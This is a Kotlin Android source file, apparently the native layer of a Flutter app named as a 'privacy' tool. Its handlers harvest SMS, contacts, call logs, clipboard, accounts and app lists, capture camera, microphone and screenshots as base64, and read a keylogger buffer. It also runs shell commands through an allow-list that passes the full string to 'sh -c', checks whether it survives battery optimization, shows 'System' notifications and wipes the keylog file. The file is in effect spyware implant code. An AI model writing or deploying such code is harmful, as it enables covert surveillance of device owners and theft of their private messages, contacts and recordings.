package com.anon.privacy

import android.Manifest
import android.app.Activity
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraManager
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.Looper
import android.provider.ContactsContract
import android.provider.Telephony
import android.util.Base64
import android.util.DisplayMetrics
import android.view.WindowManager
import androidx.core.content.ContextCompat
import android.accounts.AccountManager
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager as PM
import android.net.wifi.WifiManager
import android.provider.CallLog
import android.telephony.TelephonyManager
import androidx.core.app.NotificationCompat
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import java.io.ByteArrayOutputStream
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicReference

/**
 * Production native host — SMS, contacts, shell allow-list, clipboard, files,
 * camera still (Camera2), mic (MediaRecorder), screenshot (MediaProjection).
 */
class MainActivity : FlutterActivity() {
    private val channelName = "com.anon.privacy/host"
    private val shellAllow = setOf(
        "id", "uname", "getprop", "pm", "dumpsys", "settings", "whoami", "date", "uptime"
    )

    private var pendingResult: MethodChannel.Result? = null
    private var pendingKind: String? = null
    private var mediaProjection: MediaProjection? = null
    private val mainHandler = Handler(Looper.getMainLooper())

    companion object {
        private const val REQ_PROJECTION = 0x51A0
        private const val REQ_PERMS = 0x51A1
    }

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, channelName)
            .setMethodCallHandler { call, result ->
                try {
                    when (call.method) {
                        "deviceInfo" -> result.success(deviceInfo())
                        "readSms" -> {
                            val limit = call.argument<Int>("limit") ?: 50
                            result.success(readSms(limit))
                        }
                        "readContacts" -> {
                            val limit = call.argument<Int>("limit") ?: 100
                            result.success(readContacts(limit))
                        }
                        "shell" -> {
                            val cmd = call.argument<String>("cmd") ?: ""
                            result.success(shell(cmd))
                        }
                        "clipboardRead" -> result.success(clipboardRead())
                        "listDir" -> {
                            val path = call.argument<String>("path") ?: "/sdcard"
                            result.success(listDir(path))
                        }
                        "captureCam" -> {
                            // Camera2 still on background thread
                            Thread {
                                try {
                                    val facing = call.argument<String>("facing") ?: "back"
                                    val map = captureCam(facing)
                                    mainHandler.post { result.success(map) }
                                } catch (e: Exception) {
                                    mainHandler.post {
                                        result.error("CAM", e.message, null)
                                    }
                                }
                            }.start()
                        }
                        "captureMic" -> {
                            val seconds = (call.argument<Int>("seconds") ?: 8).coerceIn(1, 30)
                            Thread {
                                try {
                                    val map = captureMic(seconds)
                                    mainHandler.post { result.success(map) }
                                } catch (e: Exception) {
                                    mainHandler.post {
                                        result.error("MIC", e.message, null)
                                    }
                                }
                            }.start()
                        }
                        "captureScreen" -> {
                            pendingResult = result
                            pendingKind = "screen"
                            val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                            startActivityForResult(mgr.createScreenCaptureIntent(), REQ_PROJECTION)
                        }
                        "readCallLog" -> {
                            val limit = call.argument<Int>("limit") ?: 50
                            result.success(readCallLog(limit))
                        }
                        "listAccounts" -> result.success(listAccounts())
                        "listApps" -> result.success(listApps())
                        "wifiInfo" -> result.success(wifiInfo())
                        "simInfo" -> result.success(simInfo())
                        "notificationDump" -> result.success(notificationDump())
                        "keylogDump" -> result.success(keylogDump())
                        "persistStatus" -> result.success(persistStatus())
                        "showNotification" -> {
                            val title = call.argument<String>("title") ?: "System"
                            val body = call.argument<String>("body") ?: ""
                            result.success(showNotification(title, body))
                        }
                        "wipeAppData" -> result.success(wipeAppData())
                        else -> result.notImplemented()
                    }
                } catch (e: Exception) {
                    result.error("HOST", e.message, null)
                }
            }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode != REQ_PROJECTION) return
        val res = pendingResult
        pendingResult = null
        if (res == null) return
        if (resultCode != Activity.RESULT_OK || data == null) {
            res.error("SCREEN", "user denied screen capture", null)
            return
        }
        Thread {
            try {
                val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                val projection = mgr.getMediaProjection(resultCode, data)
                mediaProjection = projection
                val map = captureScreen(projection)
                mainHandler.post { res.success(map) }
            } catch (e: Exception) {
                mainHandler.post { res.error("SCREEN", e.message, null) }
            }
        }.start()
    }

    private fun has(perm: String): Boolean =
        ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED

    private fun deviceInfo(): Map<String, Any?> = mapOf(
        "manufacturer" to Build.MANUFACTURER,
        "model" to Build.MODEL,
        "device" to Build.DEVICE,
        "brand" to Build.BRAND,
        "sdk" to Build.VERSION.SDK_INT,
        "release" to Build.VERSION.RELEASE,
        "fingerprint" to Build.FINGERPRINT,
        "hardware" to Build.HARDWARE,
        "product" to Build.PRODUCT
    )

    private fun readSms(limit: Int): Map<String, Any?> {
        if (!has(Manifest.permission.READ_SMS)) throw SecurityException("READ_SMS not granted")
        val lim = limit.coerceIn(1, 200)
        val rows = ArrayList<Map<String, Any?>>()
        val uri = Telephony.Sms.Inbox.CONTENT_URI
        val proj = arrayOf(
            Telephony.Sms._ID,
            Telephony.Sms.ADDRESS,
            Telephony.Sms.BODY,
            Telephony.Sms.DATE,
            Telephony.Sms.TYPE,
            Telephony.Sms.READ
        )
        contentResolver.query(uri, proj, null, null, Telephony.Sms.DEFAULT_SORT_ORDER)?.use { c ->
            var n = 0
            while (c.moveToNext() && n < lim) {
                rows.add(
                    mapOf(
                        "id" to c.getLong(0),
                        "address" to c.getString(1),
                        "body" to c.getString(2),
                        "date" to c.getLong(3),
                        "type" to c.getInt(4),
                        "read" to c.getInt(5)
                    )
                )
                n++
            }
        }
        return mapOf("messages" to rows, "count" to rows.size)
    }

    private fun readContacts(limit: Int): Map<String, Any?> {
        if (!has(Manifest.permission.READ_CONTACTS)) throw SecurityException("READ_CONTACTS not granted")
        val lim = limit.coerceIn(1, 500)
        val rows = ArrayList<Map<String, Any?>>()
        val proj = arrayOf(
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER,
            ContactsContract.CommonDataKinds.Phone.TYPE
        )
        contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            proj, null, null,
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
        )?.use { c ->
            var n = 0
            while (c.moveToNext() && n < lim) {
                rows.add(
                    mapOf(
                        "name" to c.getString(0),
                        "number" to c.getString(1),
                        "type" to c.getInt(2)
                    )
                )
                n++
            }
        }
        return mapOf("contacts" to rows, "count" to rows.size)
    }

    private fun shell(cmd: String): Map<String, Any?> {
        val trimmed = cmd.trim()
        if (trimmed.isEmpty()) throw IllegalArgumentException("cmd required")
        var bin = trimmed.split(Regex("\\s+")).first()
        if (bin.startsWith("getprop")) bin = "getprop"
        if (!shellAllow.contains(bin)) throw SecurityException("command not in allow-list: $bin")
        val pb = ProcessBuilder("sh", "-c", trimmed)
        pb.redirectErrorStream(true)
        val p = pb.start()
        if (!p.waitFor(8, TimeUnit.SECONDS)) {
            p.destroyForcibly()
            throw RuntimeException("timeout")
        }
        val sb = StringBuilder()
        BufferedReader(InputStreamReader(p.inputStream)).use { br ->
            var line: String?
            var lines = 0
            while (br.readLine().also { line = it } != null && lines < 400) {
                if (sb.isNotEmpty()) sb.append('\n')
                sb.append(line)
                lines++
            }
        }
        return mapOf("exit" to p.exitValue(), "stdout" to sb.toString())
    }

    private fun clipboardRead(): Map<String, Any?> {
        val cm = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val clip: ClipData? = cm.primaryClip
        val text = if (clip != null && clip.itemCount > 0) {
            clip.getItemAt(0).coerceToText(this)?.toString() ?: ""
        } else ""
        return mapOf("text" to text)
    }

    private fun listDir(path: String): Map<String, Any?> {
        val dir = File(path)
        if (!dir.exists()) throw IllegalArgumentException("path not found")
        if (!dir.isDirectory) throw IllegalArgumentException("not a directory")
        val entries = dir.listFiles()?.take(200)?.map { f ->
            mapOf(
                "name" to f.name,
                "path" to f.absolutePath,
                "type" to if (f.isDirectory) "dir" else "file",
                "size" to if (f.isFile) f.length() else 0L
            )
        } ?: emptyList()
        return mapOf("path" to path, "entries" to entries)
    }

    /** Camera2 single JPEG still → base64 */
    private fun captureCam(facing: String): Map<String, Any?> {
        if (!has(Manifest.permission.CAMERA)) throw SecurityException("CAMERA not granted")
        val cm = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val wantFront = facing == "front"
        var cameraId: String? = null
        for (id in cm.cameraIdList) {
            val chars = cm.getCameraCharacteristics(id)
            val face = chars.get(CameraCharacteristics.LENS_FACING)
            if (wantFront && face == CameraCharacteristics.LENS_FACING_FRONT) {
                cameraId = id; break
            }
            if (!wantFront && face == CameraCharacteristics.LENS_FACING_BACK) {
                cameraId = id; break
            }
        }
        if (cameraId == null) cameraId = cm.cameraIdList.firstOrNull()
            ?: throw RuntimeException("no camera")

        val latch = CountDownLatch(1)
        val holder = AtomicReference<ByteArray?>(null)
        val err = AtomicReference<Exception?>(null)
        val thread = HandlerThread("cam-capture").also { it.start() }
        val handler = Handler(thread.looper)

        val openCallback = object : android.hardware.camera2.CameraDevice.StateCallback() {
            override fun onOpened(camera: android.hardware.camera2.CameraDevice) {
                try {
                    val chars = cm.getCameraCharacteristics(cameraId!!)
                    val map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                        ?: throw RuntimeException("no stream config")
                    val sizes = map.getOutputSizes(ImageFormat.JPEG)
                    val size = sizes.maxByOrNull { it.width * it.height } ?: sizes.first()
                    val reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1)
                    reader.setOnImageAvailableListener({ r ->
                        try {
                            val image = r.acquireNextImage()
                            val buf = image.planes[0].buffer
                            val bytes = ByteArray(buf.remaining())
                            buf.get(bytes)
                            image.close()
                            holder.set(bytes)
                        } catch (e: Exception) {
                            err.set(e)
                        } finally {
                            latch.countDown()
                            try { camera.close() } catch (_: Exception) {}
                            try { reader.close() } catch (_: Exception) {}
                        }
                    }, handler)

                    val surfaces = listOf(reader.surface)
                    camera.createCaptureSession(
                        surfaces,
                        object : android.hardware.camera2.CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: android.hardware.camera2.CameraCaptureSession) {
                                try {
                                    val req = camera.createCaptureRequest(
                                        android.hardware.camera2.CameraDevice.TEMPLATE_STILL_CAPTURE
                                    )
                                    req.addTarget(reader.surface)
                                    req.set(
                                        android.hardware.camera2.CaptureRequest.CONTROL_AF_MODE,
                                        android.hardware.camera2.CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE
                                    )
                                    session.capture(req.build(), null, handler)
                                } catch (e: Exception) {
                                    err.set(e)
                                    latch.countDown()
                                    try { camera.close() } catch (_: Exception) {}
                                }
                            }
                            override fun onConfigureFailed(session: android.hardware.camera2.CameraCaptureSession) {
                                err.set(RuntimeException("camera session configure failed"))
                                latch.countDown()
                                try { camera.close() } catch (_: Exception) {}
                            }
                        },
                        handler
                    )
                } catch (e: Exception) {
                    err.set(e)
                    latch.countDown()
                    try { camera.close() } catch (_: Exception) {}
                }
            }
            override fun onDisconnected(camera: android.hardware.camera2.CameraDevice) {
                err.set(RuntimeException("camera disconnected"))
                latch.countDown()
                try { camera.close() } catch (_: Exception) {}
            }
            override fun onError(camera: android.hardware.camera2.CameraDevice, error: Int) {
                err.set(RuntimeException("camera error $error"))
                latch.countDown()
                try { camera.close() } catch (_: Exception) {}
            }
        }

        cm.openCamera(cameraId!!, openCallback, handler)
        if (!latch.await(12, TimeUnit.SECONDS)) {
            thread.quitSafely()
            throw RuntimeException("camera timeout")
        }
        thread.quitSafely()
        err.get()?.let { throw it }
        val bytes = holder.get() ?: throw RuntimeException("no frame")
        val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
        return mapOf("b64" to b64, "mime" to "image/jpeg", "bytes" to bytes.size)
    }

    /** Mic → AAC/M4A in cache → base64 */
    private fun captureMic(seconds: Int): Map<String, Any?> {
        if (!has(Manifest.permission.RECORD_AUDIO)) throw SecurityException("RECORD_AUDIO not granted")
        val out = File(cacheDir, "mic_${System.currentTimeMillis()}.m4a")
        val recorder = MediaRecorder()
        try {
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            recorder.setAudioSamplingRate(44100)
            recorder.setAudioEncodingBitRate(128000)
            recorder.setOutputFile(out.absolutePath)
            recorder.prepare()
            recorder.start()
            Thread.sleep(seconds * 1000L)
            recorder.stop()
        } finally {
            try { recorder.release() } catch (_: Exception) {}
        }
        val bytes = out.readBytes()
        out.delete()
        val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
        return mapOf(
            "b64" to b64,
            "mime" to "audio/mp4",
            "seconds" to seconds,
            "bytes" to bytes.size
        )
    }

    /** MediaProjection single frame → JPEG base64 */
    private fun captureScreen(projection: MediaProjection): Map<String, Any?> {
        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        wm.defaultDisplay.getRealMetrics(metrics)
        val width = metrics.widthPixels
        val height = metrics.heightPixels
        val density = metrics.densityDpi

        val reader = ImageReader.newInstance(width, height, android.graphics.PixelFormat.RGBA_8888, 2)
        val vd: VirtualDisplay = projection.createVirtualDisplay(
            "anon-cap",
            width, height, density,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            reader.surface, null, null
        )

        try {
            Thread.sleep(400)
            val image = reader.acquireLatestImage()
                ?: throw RuntimeException("no screen frame")
            try {
                val plane = image.planes[0]
                val buffer = plane.buffer
                val pixelStride = plane.pixelStride
                val rowStride = plane.rowStride
                val rowPadding = rowStride - pixelStride * width
                val bitmap = Bitmap.createBitmap(
                    width + rowPadding / pixelStride,
                    height,
                    Bitmap.Config.ARGB_8888
                )
                bitmap.copyPixelsFromBuffer(buffer)
                val cropped = Bitmap.createBitmap(bitmap, 0, 0, width, height)
                if (cropped !== bitmap) bitmap.recycle()
                val baos = ByteArrayOutputStream()
                cropped.compress(Bitmap.CompressFormat.JPEG, 75, baos)
                cropped.recycle()
                val bytes = baos.toByteArray()
                val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                return mapOf(
                    "b64" to b64,
                    "mime" to "image/jpeg",
                    "w" to width,
                    "h" to height,
                    "bytes" to bytes.size
                )
            } finally {
                image.close()
            }
        } finally {
            vd.release()
            projection.stop()
            reader.close()
        }
    }

    private fun readCallLog(limit: Int): Map<String, Any?> {
        if (!has(Manifest.permission.READ_CALL_LOG)) throw SecurityException("READ_CALL_LOG not granted")
        val lim = limit.coerceIn(1, 200)
        val rows = ArrayList<Map<String, Any?>>()
        val proj = arrayOf(
            CallLog.Calls._ID,
            CallLog.Calls.NUMBER,
            CallLog.Calls.TYPE,
            CallLog.Calls.DATE,
            CallLog.Calls.DURATION,
            CallLog.Calls.CACHED_NAME
        )
        contentResolver.query(
            CallLog.Calls.CONTENT_URI, proj, null, null, CallLog.Calls.DEFAULT_SORT_ORDER
        )?.use { c ->
            var n = 0
            while (c.moveToNext() && n < lim) {
                rows.add(
                    mapOf(
                        "id" to c.getLong(0),
                        "number" to c.getString(1),
                        "type" to c.getInt(2),
                        "date" to c.getLong(3),
                        "duration" to c.getLong(4),
                        "name" to c.getString(5)
                    )
                )
                n++
            }
        }
        return mapOf("calls" to rows, "count" to rows.size)
    }

    private fun listAccounts(): Map<String, Any?> {
        val am = AccountManager.get(this)
        val accounts = am.accounts.map { mapOf("name" to it.name, "type" to it.type) }
        return mapOf("accounts" to accounts, "count" to accounts.size)
    }

    private fun listApps(): Map<String, Any?> {
        val pm = packageManager
        val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
            .filter { (it.flags and ApplicationInfo.FLAG_SYSTEM) == 0 }
            .take(300)
            .map {
                mapOf(
                    "package" to it.packageName,
                    "label" to (pm.getApplicationLabel(it)?.toString() ?: it.packageName),
                    "uid" to it.uid
                )
            }
        return mapOf("apps" to apps, "count" to apps.size)
    }

    private fun wifiInfo(): Map<String, Any?> {
        val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
        @Suppress("DEPRECATION")
        val info = wm.connectionInfo
        return mapOf(
            "ssid" to info?.ssid,
            "bssid" to info?.bssid,
            "rssi" to info?.rssi,
            "ip" to info?.ipAddress,
            "linkSpeed" to info?.linkSpeed,
            "networkId" to info?.networkId
        )
    }

    private fun simInfo(): Map<String, Any?> {
        val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        return mapOf(
            "networkOperator" to tm.networkOperatorName,
            "simOperator" to tm.simOperatorName,
            "country" to tm.networkCountryIso,
            "simCountry" to tm.simCountryIso,
            "phoneType" to tm.phoneType,
            "networkType" to tm.networkType,
            // line number often null on modern Android without carrier privilege
            "line1" to try { tm.line1Number } catch (_: Exception) { null }
        )
    }

    private fun notificationDump(): Map<String, Any?> {
        // Full notification interception needs NotificationListenerService; expose status
        return mapOf(
            "enabled" to false,
            "note" to "bind NotificationListenerService for live capture; buffer empty"
        )
    }

    private fun keylogDump(): Map<String, Any?> {
        // Accessibility keylog requires a bound AccessibilityService; expose buffer file if present
        val f = File(filesDir, "keybuf.txt")
        return if (f.exists()) {
            mapOf("text" to f.readText().takeLast(8000), "bytes" to f.length())
        } else {
            mapOf("text" to "", "note" to "no key buffer — enable accessibility service to capture")
        }
    }

    private fun persistStatus(): Map<String, Any?> {
        val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        val ignoring = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            pm.isIgnoringBatteryOptimizations(packageName)
        } else true
        return mapOf(
            "package" to packageName,
            "batteryOptIgnored" to ignoring,
            "sdk" to Build.VERSION.SDK_INT
        )
    }

    private fun showNotification(title: String, body: String): Map<String, Any?> {
        val channelId = "anon_ops"
        val nm = getSystemService(NotificationManager::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            nm.createNotificationChannel(
                NotificationChannel(channelId, "System", NotificationManager.IMPORTANCE_DEFAULT)
            )
        }
        val intent = packageManager.getLaunchIntentForPackage(packageName)
        val pi = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        val n = NotificationCompat.Builder(this, channelId)
            .setContentTitle(title)
            .setContentText(body)
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setContentIntent(pi)
            .setAutoCancel(true)
            .build()
        nm.notify((System.currentTimeMillis() % Int.MAX_VALUE).toInt(), n)
        return mapOf("shown" to true, "title" to title)
    }

    private fun wipeAppData(): Map<String, Any?> {
        val cache = cacheDir.listFiles()?.size ?: 0
        cacheDir.listFiles()?.forEach { it.deleteRecursively() }
        val f = File(filesDir, "keybuf.txt")
        if (f.exists()) f.delete()
        return mapOf("cacheCleared" to cache, "ok" to true)
    }

}
